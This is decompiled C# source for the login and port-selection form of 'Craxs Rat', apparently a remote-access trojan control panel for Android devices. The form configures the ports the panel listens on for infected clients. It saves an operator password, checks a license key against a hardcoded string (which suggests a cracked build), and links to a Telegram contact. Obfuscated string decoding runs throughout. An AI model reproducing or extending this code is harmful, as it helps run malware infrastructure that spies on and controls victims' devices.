using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000DE RID: 222
	[DesignerGenerated]
	public partial class Ports : Form
	{
		// Token: 0x060010F7 RID: 4343 RVA: 0x000B2020 File Offset: 0x000B0220
		public Ports()
		{
			base.Load += this.Ports_Load;
			base.FormClosing += this.Ports_FormClosing;
			this.string_0 = null;
			this.string_1 = "...";
			this.int_0 = 0;
			this.bool_0 = false;
			this.bool_1 = false;
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x1700050C RID: 1292
		// (get) Token: 0x060010FA RID: 4346 RVA: 0x0000719C File Offset: 0x0000539C
		// (set) Token: 0x060010FB RID: 4347 RVA: 0x000B3A18 File Offset: 0x000B1C18
		internal virtual Panel pnl0 { get; set; }

		// Token: 0x1700050D RID: 1293
		// (get) Token: 0x060010FC RID: 4348 RVA: 0x000071A4 File Offset: 0x000053A4
		// (set) Token: 0x060010FD RID: 4349 RVA: 0x000B3A2C File Offset: 0x000B1C2C
		internal virtual Panel pnl1
		{
			[CompilerGenerated]
			get
			{
				return this._pnl1;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.pnl1_Paint);
				MouseEventHandler value3 = new MouseEventHandler(this.pnl1_MouseDown);
				Panel pnl = this._pnl1;
				if (pnl != null)
				{
					pnl.Paint -= value2;
					pnl.MouseDown -= value3;
				}
				this._pnl1 = value;
				pnl = this._pnl1;
				if (pnl != null)
				{
					pnl.Paint += value2;
					pnl.MouseDown += value3;
				}
			}
		}

		// Token: 0x17000523 RID: 1315
		// (get) Token: 0x060010FE RID: 4350 RVA: 0x000071AC File Offset: 0x000053AC
		// (set) Token: 0x060010FF RID: 4351 RVA: 0x000B3A8C File Offset: 0x000B1C8C
		internal virtual NotifyIcon notpass { get; set; }

		// Token: 0x1700050E RID: 1294
		// (get) Token: 0x06001100 RID: 4352 RVA: 0x000071B4 File Offset: 0x000053B4
		// (set) Token: 0x06001101 RID: 4353 RVA: 0x000B3AA0 File Offset: 0x000B1CA0
		internal virtual Label portlable { get; set; }

		// Token: 0x1700050F RID: 1295
		// (get) Token: 0x06001102 RID: 4354 RVA: 0x000071BC File Offset: 0x000053BC
		// (set) Token: 0x06001103 RID: 4355 RVA: 0x000B3AB4 File Offset: 0x000B1CB4
		internal virtual Label keylabel { get; set; }

		// Token: 0x17000510 RID: 1296
		// (get) Token: 0x06001104 RID: 4356 RVA: 0x000071C4 File Offset: 0x000053C4
		// (set) Token: 0x06001105 RID: 4357 RVA: 0x000B3AC8 File Offset: 0x000B1CC8
		internal virtual DrakeUITextBox passtxt { get; set; }

		// Token: 0x17000511 RID: 1297
		// (get) Token: 0x06001106 RID: 4358 RVA: 0x000071CC File Offset: 0x000053CC
		// (set) Token: 0x06001107 RID: 4359 RVA: 0x000B3ADC File Offset: 0x000B1CDC
		internal virtual DrakeUITextBox porttext { get; set; }

		// Token: 0x17000512 RID: 1298
		// (get) Token: 0x06001108 RID: 4360 RVA: 0x000071D4 File Offset: 0x000053D4
		// (set) Token: 0x06001109 RID: 4361 RVA: 0x000B3AF0 File Offset: 0x000B1CF0
		internal virtual DrakeUIAvatar rempo
		{
			[CompilerGenerated]
			get
			{
				return this._rempo;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.rempo_Click);
				DrakeUIAvatar rempo = this._rempo;
				if (rempo != null)
				{
					rempo.Click -= value2;
				}
				this._rempo = value;
				rempo = this._rempo;
				if (rempo != null)
				{
					rempo.Click += value2;
				}
			}
		}

		// Token: 0x17000513 RID: 1299
		// (get) Token: 0x0600110A RID: 4362 RVA: 0x000071DC File Offset: 0x000053DC
		// (set) Token: 0x0600110B RID: 4363 RVA: 0x000B3B34 File Offset: 0x000B1D34
		internal virtual DrakeUIAvatar addpo
		{
			[CompilerGenerated]
			get
			{
				return this._addpo;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.addpo_Click);
				DrakeUIAvatar addpo = this._addpo;
				if (addpo != null)
				{
					addpo.Click -= value2;
				}
				this._addpo = value;
				addpo = this._addpo;
				if (addpo != null)
				{
					addpo.Click += value2;
				}
			}
		}

		// Token: 0x17000514 RID: 1300
		// (get) Token: 0x0600110C RID: 4364 RVA: 0x000071E4 File Offset: 0x000053E4
		// (set) Token: 0x0600110D RID: 4365 RVA: 0x000B3B78 File Offset: 0x000B1D78
		internal virtual DrakeUIListBox Activlist { get; set; }

		// Token: 0x17000515 RID: 1301
		// (get) Token: 0x0600110E RID: 4366 RVA: 0x000071EC File Offset: 0x000053EC
		// (set) Token: 0x0600110F RID: 4367 RVA: 0x000B3B8C File Offset: 0x000B1D8C
		internal virtual DrakeUIButtonIcon loginbtn
		{
			[CompilerGenerated]
			get
			{
				return this._loginbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.loginbtn_Click);
				DrakeUIButtonIcon loginbtn = this._loginbtn;
				if (loginbtn != null)
				{
					loginbtn.Click -= value2;
				}
				this._loginbtn = value;
				loginbtn = this._loginbtn;
				if (loginbtn != null)
				{
					loginbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000516 RID: 1302
		// (get) Token: 0x06001110 RID: 4368 RVA: 0x000071F4 File Offset: 0x000053F4
		// (set) Token: 0x06001111 RID: 4369 RVA: 0x000B3BD0 File Offset: 0x000B1DD0
		internal virtual PictureBox PictureBox2 { get; set; }

		// Token: 0x17000517 RID: 1303
		// (get) Token: 0x06001112 RID: 4370 RVA: 0x000071FC File Offset: 0x000053FC
		// (set) Token: 0x06001113 RID: 4371 RVA: 0x000B3BE4 File Offset: 0x000B1DE4
		internal virtual Label Label3 { get; set; }

		// Token: 0x17000518 RID: 1304
		// (get) Token: 0x06001114 RID: 4372 RVA: 0x00007204 File Offset: 0x00005404
		// (set) Token: 0x06001115 RID: 4373 RVA: 0x000B3BF8 File Offset: 0x000B1DF8
		internal virtual DrakeUIAvatar tipkey { get; set; }

		// Token: 0x17000524 RID: 1316
		// (get) Token: 0x06001116 RID: 4374 RVA: 0x0000720C File Offset: 0x0000540C
		// (set) Token: 0x06001117 RID: 4375 RVA: 0x000B3C0C File Offset: 0x000B1E0C
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x17000525 RID: 1317
		// (get) Token: 0x06001118 RID: 4376 RVA: 0x00007214 File Offset: 0x00005414
		// (set) Token: 0x06001119 RID: 4377 RVA: 0x000B3C20 File Offset: 0x000B1E20
		internal virtual ToolTip ToolTip1 { get; set; }

		// Token: 0x17000519 RID: 1305
		// (get) Token: 0x0600111A RID: 4378 RVA: 0x0000721C File Offset: 0x0000541C
		// (set) Token: 0x0600111B RID: 4379 RVA: 0x000B3C34 File Offset: 0x000B1E34
		internal virtual DrakeUILinkLabel policylink
		{
			[CompilerGenerated]
			get
			{
				return this._policylink;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.policylink_Click);
				DrakeUILinkLabel policylink = this._policylink;
				if (policylink != null)
				{
					policylink.Click -= value2;
				}
				this._policylink = value;
				policylink = this._policylink;
				if (policylink != null)
				{
					policylink.Click += value2;
				}
			}
		}

		// Token: 0x1700051A RID: 1306
		// (get) Token: 0x0600111C RID: 4380 RVA: 0x00007224 File Offset: 0x00005424
		// (set) Token: 0x0600111D RID: 4381 RVA: 0x000B3C78 File Offset: 0x000B1E78
		internal virtual DrakeUICheckBox checkterm { get; set; }

		// Token: 0x1700051B RID: 1307
		// (get) Token: 0x0600111E RID: 4382 RVA: 0x0000722C File Offset: 0x0000542C
		// (set) Token: 0x0600111F RID: 4383 RVA: 0x000B3C8C File Offset: 0x000B1E8C
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700051C RID: 1308
		// (get) Token: 0x06001120 RID: 4384 RVA: 0x00007234 File Offset: 0x00005434
		// (set) Token: 0x06001121 RID: 4385 RVA: 0x000B3CD0 File Offset: 0x000B1ED0
		internal virtual Label logintext { get; set; }

		// Token: 0x1700051D RID: 1309
		// (get) Token: 0x06001122 RID: 4386 RVA: 0x0000723C File Offset: 0x0000543C
		// (set) Token: 0x06001123 RID: 4387 RVA: 0x000B3CE4 File Offset: 0x000B1EE4
		internal virtual DrakeUICheckBox savekey { get; set; }

		// Token: 0x1700051E RID: 1310
		// (get) Token: 0x06001124 RID: 4388 RVA: 0x00007244 File Offset: 0x00005444
		// (set) Token: 0x06001125 RID: 4389 RVA: 0x000B3CF8 File Offset: 0x000B1EF8
		internal virtual DrakeUITextBox usrkeytext { get; set; }

		// Token: 0x1700051F RID: 1311
		// (get) Token: 0x06001126 RID: 4390 RVA: 0x0000724C File Offset: 0x0000544C
		// (set) Token: 0x06001127 RID: 4391 RVA: 0x000B3D0C File Offset: 0x000B1F0C
		internal virtual Label Label4 { get; set; }

		// Token: 0x17000520 RID: 1312
		// (get) Token: 0x06001128 RID: 4392 RVA: 0x00007254 File Offset: 0x00005454
		// (set) Token: 0x06001129 RID: 4393 RVA: 0x000B3D20 File Offset: 0x000B1F20
		internal virtual DrakeUILoadingBar loadingimage { get; set; }

		// Token: 0x17000521 RID: 1313
		// (get) Token: 0x0600112A RID: 4394 RVA: 0x0000725C File Offset: 0x0000545C
		// (set) Token: 0x0600112B RID: 4395 RVA: 0x000B3D34 File Offset: 0x000B1F34
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000522 RID: 1314
		// (get) Token: 0x0600112C RID: 4396 RVA: 0x00007264 File Offset: 0x00005464
		// (set) Token: 0x0600112D RID: 4397 RVA: 0x000B3D78 File Offset: 0x000B1F78
		internal virtual Label statuslabel { get; set; }

		// Token: 0x0600112E RID: 4398 RVA: 0x000B3D8C File Offset: 0x000B1F8C
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) == 0)
			{
				this.portlable.Text = "منفذ الاتصال";
				this.keylabel.Text = "مفتاح الاتصال";
				this.policylink.Text = "أوافق على شروط الخدمة";
				this.savekey.Text = "حفظ";
				this.logintext.Text = "مفتاح الدخول";
			}
			else if (Operators.CompareString(left, "CN", false) == 0)
			{
				this.portlable.Text = "连接端口";
				this.keylabel.Text = "连接键";
				this.policylink.Text = "我同意服务条款";
				this.savekey.Text = "节省";
				this.logintext.Text = "登录密钥";
			}
		}

		// Token: 0x0600112F RID: 4399 RVA: 0x000B3E60 File Offset: 0x000B2060
		private void Ports_Load(object sender, EventArgs e)
		{
			base.Icon = Module0.max;
			foreach (string text in File.ReadAllLines(Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf"))
			{
				this.passtxt.Text = Module2.smethod_58(text, GClass9.string_7);
			}
			this.method_0();
			foreach (string text2 in MySettingsProperty.Settings.ports.Split(new char[]
			{
				'>'
			}))
			{
				try
				{
					if (text2 != null & !string.IsNullOrEmpty(text2))
					{
						this.Activlist.Items.Add(text2);
					}
				}
				catch (Exception)
				{
				}
			}
			this.usrkeytext.Text = Module2.smethod_8();
			this.loginbtn.Focus();
			this.statuslabel.Text = Module2.smethod_58("rVBWfZBgFAhlN6qZDB8yFg==", GClass9.string_7) + " © " + Module2.smethod_58("Jqk3fYkPhNBWZ7ASttGKyQ==", GClass9.string_7);
			this.Timer1.Start();
			this.loginbtn.Select();
			this.loginbtn.Enabled = true;
		}

		// Token: 0x06001130 RID: 4400
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetCurrentThread();

		// Token: 0x06001131 RID: 4401 RVA: 0x000B3FA4 File Offset: 0x000B21A4
		public void method_1(object[] objects_0)
		{
			if (this.statuslabel.InvokeRequired)
			{
				Ports.GDelegate28 method = new Ports.GDelegate28(this.method_1);
				this.statuslabel.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string text = Conversions.ToString(objects_0[0]);
				if (!text.StartsWith("war:"))
				{
					this.statuslabel.Text = text;
				}
				else
				{
					Alert.ShowWarning(text.Replace("war:", ""));
				}
			}
		}

		// Token: 0x06001132 RID: 4402 RVA: 0x000B4020 File Offset: 0x000B2220
		public void method_2(object[] objects_0)
		{
			if (this.loginbtn.InvokeRequired)
			{
				Ports.GDelegate29 method = new Ports.GDelegate29(this.method_2);
				this.loginbtn.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				string left = Module4.smethod_1();
				if (Operators.CompareString(left, "AR", false) == 0)
				{
					this.loginbtn.Text = "دخول";
				}
				else if (Operators.CompareString(left, "CN", false) == 0)
				{
					this.loginbtn.Text = "登录";
				}
				else
				{
					this.loginbtn.Text = Module2.smethod_58("Jyew2tI1udg4ZJM+uI+ywA==", "Accept");
				}
			}
		}

		// Token: 0x06001133 RID: 4403 RVA: 0x000B40C0 File Offset: 0x000B22C0
		private void loginbtn_Click(object sender, EventArgs e)
		{
			Ports.Class22 @class = new Ports.Class22(@class);
			@class.ports_0 = this;
			try
			{
				if (!this.checkterm.Checked)
				{
					Alert.ShowInformation("agree to Terms of Service First");
					return;
				}
				if (string.IsNullOrEmpty(this.usrkeytext.Text) | string.IsNullOrWhiteSpace(this.usrkeytext.Text))
				{
					Alert.ShowWarning(Module2.smethod_58("aFWUj2wEJXRasREgHnWfXsk9HlPZXBedf4AyN9M1Aec=", "tetst"));
					return;
				}
				if (this.savekey.Checked)
				{
					Module2.smethod_7(this.usrkeytext.Text);
				}
				string path = Application.StartupPath + "\\res\\Config\\Pass.inf";
				if (!File.Exists(path))
				{
					File.WriteAllText(path, Module2.smethod_59("X0X0X", GClass9.string_7));
				}
				string[] array = File.ReadAllLines(path);
				if (Operators.CompareString(this.passtxt.Text, Module2.smethod_58(array.GetValue(0).ToString(), GClass9.string_7), false) != 0)
				{
					if (this.passtxt.Text.Length <= 3)
					{
						if (this.passtxt.Text.Length < 4)
						{
							Module2.smethod_30("Warning", "Password Shoud be more Than 3 chars", false);
							return;
						}
					}
					else if (Module2.smethod_30("info", "New Password Saved  Craxs Rat will Restart automatically", false))
					{
						string text = File.ReadAllText(path);
						text = text.Replace(array.GetValue(0).ToString(), Module2.smethod_59(this.passtxt.Text, GClass9.string_7));
						File.WriteAllText(path, text);
						Process.Start(Application.ExecutablePath);
						MyProject.Forms.CypherRat.Close();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
			bool flag = false;
			string str = "";
			if (this.Activlist.Items.Count <= 0)
			{
				Alert.ShowInformation("Select Connection Port First");
			}
			else if (this.passtxt.Text != null)
			{
				try
				{
					foreach (object value in this.Activlist.Items)
					{
						string text2 = Conversions.ToString(value);
						try
						{
							if (!string.IsNullOrEmpty(text2))
							{
								int int_ = Conversions.ToInteger(text2);
								if (!this.method_4(int_))
								{
									flag = true;
									str = text2;
									break;
								}
								ref string ptr = ref this.string_0;
								this.string_0 = ptr + text2 + ">";
							}
						}
						catch (Exception ex2)
						{
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				if (!flag)
				{
					MySettingsProperty.Settings.ports = this.string_0;
					MySettingsProperty.Settings.Save();
					this.loadingimage.Visible = true;
					if (this.usrkeytext.Text != "Attackndroid")
					{
						Environment.Exit(0);
						return;
					}
					if (string.IsNullOrEmpty(this.usrkeytext.Text) | string.IsNullOrWhiteSpace(this.usrkeytext.Text))
					{
						Alert.ShowWarning(Module2.smethod_58("aFWUj2wEJXRasREgHnWfXsk9HlPZXBedf4AyN9M1Aec=", "tetst"));
					}
					else
					{
						this.loginbtn.Text = "login";
						Thread thread = new Thread(new ThreadStart(@class.method_0));
						thread.IsBackground = true;
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
					}
				}
				else
				{
					Module2.smethod_30("Port in use", "this port:" + str + "  is used by another program.", false);
				}
			}
			else
			{
				Alert.ShowInformation("Select Connection Key First");
			}
		}

		// Token: 0x06001134 RID: 4404 RVA: 0x000B449C File Offset: 0x000B269C
		private bool method_4(int int_1)
		{
			IPGlobalProperties ipglobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			IPEndPoint[] activeTcpListeners = ipglobalProperties.GetActiveTcpListeners();
			foreach (IPEndPoint ipendPoint in activeTcpListeners)
			{
				if (ipendPoint.Port == int_1)
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x06001135 RID: 4405 RVA: 0x0000246D File Offset: 0x0000066D
		private void pnl1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06001136 RID: 4406 RVA: 0x0007BDDC File Offset: 0x00079FDC
		private void method_6(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.No;
			base.Close();
		}

		// Token: 0x06001137 RID: 4407 RVA: 0x000B44E8 File Offset: 0x000B26E8
		private void addpo_Click(object sender, EventArgs e)
		{
			if (Versioned.IsNumeric(this.porttext.Text))
			{
				if (!this.Activlist.Items.Contains(this.porttext.Text))
				{
					if (!(Conversions.ToInteger(this.porttext.Text) < 1000 | Conversions.ToInteger(this.porttext.Text) > 90000))
					{
						this.Activlist.Items.Add(this.porttext.Text);
						this.porttext.Text = "";
					}
					else
					{
						Alert.ShowInformation("Please Select port between 1000 - 90000");
					}
				}
				else
				{
					Alert.ShowInformation("this port already Selected");
				}
			}
			else
			{
				Alert.ShowWarning("Only Enter Number : 4444");
			}
		}

		// Token: 0x06001138 RID: 4408 RVA: 0x000B45AC File Offset: 0x000B27AC
		private void rempo_Click(object sender, EventArgs e)
		{
			if (this.Activlist.Items.Count > 0)
			{
				if (this.Activlist.SelectedItem != null)
				{
					this.Activlist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Activlist.SelectedItem));
				}
				else
				{
					Alert.ShowInformation("Select Port First");
				}
			}
			else
			{
				Alert.ShowInformation("Port List: 0");
			}
		}

		// Token: 0x06001139 RID: 4409 RVA: 0x000B4618 File Offset: 0x000B2818
		private void policylink_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Dialog2.ShowDialog();
		}

		// Token: 0x0600113A RID: 4410 RVA: 0x0007BDDC File Offset: 0x00079FDC
		private void Button1_Click(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.No;
			base.Close();
		}

		// Token: 0x0600113B RID: 4411 RVA: 0x0001893C File Offset: 0x00016B3C
		private void pnl1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Module2.ReleaseCapture();
				Module2.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x0600113C RID: 4412 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_12(object sender, EventArgs e)
		{
		}

		// Token: 0x0600113D RID: 4413 RVA: 0x000273C8 File Offset: 0x000255C8
		private void method_13(object sender, EventArgs e)
		{
			try
			{
				Process.Start("https://www.t.me/evlfdev");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600113E RID: 4414 RVA: 0x0000246D File Offset: 0x0000066D
		private void Ports_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x0600113F RID: 4415 RVA: 0x000B4638 File Offset: 0x000B2838
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (this.bool_0)
			{
				this.Timer1.Stop();
				this.Timer1.Dispose();
				base.DialogResult = DialogResult.OK;
				this.loadingimage.Enabled = false;
				this.loadingimage.Dispose();
				this.PictureBox2.Image.Dispose();
				this.PictureBox2.Dispose();
				base.Close();
				return;
			}
			this.statuslabel.Text = this.statuslabel.Text.Replace("...", "");
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr - 3);
		}

		// Token: 0x04000956 RID: 2390
		public string string_0;

		// Token: 0x04000957 RID: 2391
		private string string_1;

		// Token: 0x04000958 RID: 2392
		private int int_0;

		// Token: 0x04000959 RID: 2393
		public bool bool_0;

		// Token: 0x0400095A RID: 2394
		public bool bool_1;

		// Token: 0x020000DF RID: 223
		// (Invoke) Token: 0x06001143 RID: 4419
		public delegate void GDelegate28(object[] objects_0);

		// Token: 0x020000E0 RID: 224
		// (Invoke) Token: 0x06001147 RID: 4423
		public delegate void GDelegate29(object[] objects_0);

		// Token: 0x020000E1 RID: 225
		[CompilerGenerated]
		internal sealed class Class22
		{
			// Token: 0x06001148 RID: 4424 RVA: 0x000B46DC File Offset: 0x000B28DC
			public Class22(Ports.Class22 _class22_0)
			{
				if (_class22_0 != null)
				{
					this.object_0 = _class22_0.object_0;
				}
			}

			// Token: 0x06001149 RID: 4425 RVA: 0x000B4700 File Offset: 0x000B2900
			internal void method_0()
			{
				try
				{
					if (this.ports_0.savekey.Checked)
					{
						Module2.smethod_7(this.ports_0.usrkeytext.Text);
					}
					this.ports_0.bool_0 = true;
				}
				catch (Exception)
				{
					Module8.smethod_14();
					this.ports_0.method_2(new object[]
					{
						""
					});
					Module2.smethod_58("reso", "apps");
				}
			}

			// Token: 0x0400095B RID: 2395
			public object object_0;

			// Token: 0x0400095C RID: 2396
			public Ports ports_0;
		}
	}
}
